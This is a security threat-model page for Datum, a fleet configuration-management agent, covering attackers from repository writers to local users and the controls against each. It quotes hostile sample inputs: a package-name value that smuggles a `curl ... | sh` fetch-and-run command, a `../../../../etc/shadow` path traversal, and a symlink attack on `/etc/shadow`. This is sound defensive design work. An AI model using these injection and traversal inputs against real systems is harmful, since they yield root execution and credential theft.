# Threat model

Vectors are grouped by what the attacker can already do, because that is what decides which
controls are available. Each one records the impact and the design's position, using the
labels from [project status](../introduction/project-status.md).

## An attacker who can merge to the repository

**Arbitrary root execution across the fleet.** A merged change reaches every host it matches,
applied by an agent running as root. No further control sits between the merge and the host.

Mitigation is entirely outside Datum, being branch protection, required review, and restricting who
can approve. The design's contribution is that the change is a readable diff of declared state, not
a script, so review has something reviewable, and that provenance makes it possible to ask
afterwards which layer introduced a value.

**A commit that never went through review.** Whoever controls the Git remote, or an attacker
holding an account on the Git server with push rights, can place a commit on the tracked branch directly.
Transport authentication does not help, because the commit arrives over a legitimate
connection.

The control is signature verification on the agent, which moves trust from the Git server to a key.
It is the only control that constrains a repository writer, and it is specified under
[trusting desired state](repository-trust.md#verifying-that-a-revision-is-genuine), including
the `signed-tag` mode that avoids requiring every commit to be signed.

**Replaying an old revision.** A valid, signed, older commit reintroduces a vulnerability that
was fixed. Signature verification alone does not catch this, because the old commit is
genuinely signed.

The control is the descendant requirement described under [verifying that a revision is
current](repository-trust.md#verifying-that-a-revision-is-current). The agent records the
revision it last applied and refuses anything that is not a descendant of it, so Git's own
history supplies the ordering.

The residual gap is first contact, because a host with no recorded revision has nothing to compare
against and accepts whatever signed revision it sees first. Closing that belongs to provisioning,
not to the agent.

## An attacker who can read the repository

**Fleet-wide configuration disclosure.** Reading the repository reveals the configuration of
every host, including file contents, package sets, user accounts and the structure of the
estate.

Every managed host has this capability, so compromising the least important machine in the fleet
discloses the configuration of the most important one. Narrowing it would mean resolving manifests
away from the host, which [Datum does not do](../architecture/deployment-models.md).

**Credential theft from a host.** The repository credential sits on disk on every host. Stealing
one from anywhere grants repository read access from anywhere.

Credentials are read-only, root-owned at mode `0600`, and per-host so that one can be revoked
without touching the fleet, which is specified under [repository
credentials](repository-trust.md#repository-credentials).

That limits who can use a stolen credential, not what it grants. Per-host credentials are a
mitigation, not a fix.

## An attacker with root on one managed host

**Lying about observed state.** The agent runs on the host, so it can report anything. Datum
will then apply changes that are not needed or skip changes that are.

The impact is bounded to that machine, and the important consequence is for reporting, not for
configuration. A converged status from a host is a claim made by that host, so a green fleet report
is not evidence of compliance. Treating it as an attestation would be wrong, and no part of the
design attempts to make it one.

**Preventing reconciliation.** Stopping the agent, blocking its network access or corrupting its
configuration all stop that host converging. Detection depends on noticing the absence of reports
instead of receiving a bad one, which is a monitoring property Datum does not currently provide.

**Claiming another host's identity.** This gains nothing, because the host already reads the
whole repository. Identity selects which configuration to apply and grants no access.

## An attacker with an unprivileged account on a managed host

This position is the most frequently overlooked, and it is where a root-privileged agent is most
dangerous. Every item here is a requirement on providers, not a design position.

**Symlink substitution at a managed path.** Datum writes a file as root. An unprivileged user who
can create entries in the target directory replaces the target with a symlink to `/etc/shadow`,
and root follows it.

The directory does not have to be world-writable for this to matter. Any path under a directory
owned by a service account, which is common under `/var/lib` and `/srv`, is reachable by whoever
controls that account.

The control is specified under [resolving a managed
path](provider-safety.md#resolving-a-managed-path) and [writing a
file](provider-safety.md#writing-a-file). The final component is opened with `O_NOFOLLOW`, the
temporary file is created in the target directory with `O_EXCL`, and ownership and mode are set
on the descriptor before any content is written.

**Substitution between observation and apply.** Observation reads a path and the planner decides
an update is needed. The path is replaced before the reconciler writes.

The control is to resolve the path once per pass and hold the parent directory as a file descriptor,
then confirm at apply time that the descriptor still refers to the device and inode recorded during
observation. A descriptor cannot be redirected the way a re-resolved path string can, so this
prevents the substitution rather than detecting it afterwards.

Verification still catches anything that slips through, because the affected resource is read
again and will not match.

**Hard links to files the attacker cannot read.** An unprivileged user creates a hard link, in a
directory they control, to a file they have no access to. A `File` or `Directory` resource that
then changes ownership or mode on that path grants them access to the original.

The control is to refuse a metadata-only change on a path whose link count is greater than one, and
to report the refusal instead of proceeding, as specified under [hard
links](provider-safety.md#hard-links). Managing the file's content makes the case safe, because a
rename breaks the link instead of following it.

**Reading reports and plans.** A plan can contain file content, and a report written
world-readable hands it to any local user.

Reports live under the agent's state directory at mode `0600` inside a `0700` directory, both
root-owned, and content is recorded as a digest, never as text. A file can additionally be marked
`sensitive` so its content is never rendered at all. Both are specified under [reports and content
disclosure](provider-safety.md#reports-and-content-disclosure).

## An attacker who controls resource field values

This overlaps with repository write access and is listed separately because the controls are
implementation rules, not process.

**Command injection through a field.** A package name of `nginx; curl http://host/x | sh` reaches
a provider. If the provider builds a shell string, that runs as root.

The control is the [no shell rule](provider-safety.md#no-shell). Providers invoke an
argument vector directly, so a field value is one argument and cannot be interpreted as syntax.
Nothing above the provider boundary executes anything at all.

**Field values that are syntactically valid and semantically wrong.** A package name containing a
path separator, a unit name containing a slash, or a sysctl key containing `..` can reach tooling
that interprets them.

The control is [validation when the manifest
loads](provider-safety.md#field-validation-happens-when-the-manifest-loads), which rejects
dangerous character classes universally and leaves distribution-specific name rules to
providers. A failing value is a manifest error raised before the host is read.

**Path traversal through a content source.** A `File.desired.source` of `../../../../etc/shadow`
would read outside the repository and write its contents to a host.

The control is [source confinement](provider-safety.md#confining-content-sources). A source path
must be relative, resolves against its layer directory, and the result has to remain inside the
fleet root with symbolic links resolved before that check and not after.

## An attacker on the network

**Interception between agent and Git remote.** Mitigated by transport authentication, which the
design assumes is working. Commit signature verification would make interception insufficient on
its own, because modified content would not verify.

## An attacker who controls upstream content

**A package repository Datum was told to trust.** A `File` resource writing a sources list adds a
third-party repository, after which the package manager installs and trusts whatever it serves.
The result is root execution, arranged entirely through a legitimate-looking configuration file.

This needs stating because adding a repository looks like an ordinary file change in review. It is
also the main security consideration behind a future `Repository` resource type, which would at
least make the intent explicit and reviewable as its own thing instead of as a file containing a
URL.

**Package content itself.** Signature verification is the distribution's, not Datum's. A
repository whose signing key is configured and trusted produces packages Datum installs without
further question.

## Not modelled

Denial of service against a host by its own configuration is not treated as an attack. A matcher
that accidentally matches every host and declares a critical package absent will remove it
everywhere, and that is a blast radius problem, not a security boundary.

Side channels, physical access and hypervisor-level compromise are out of scope.
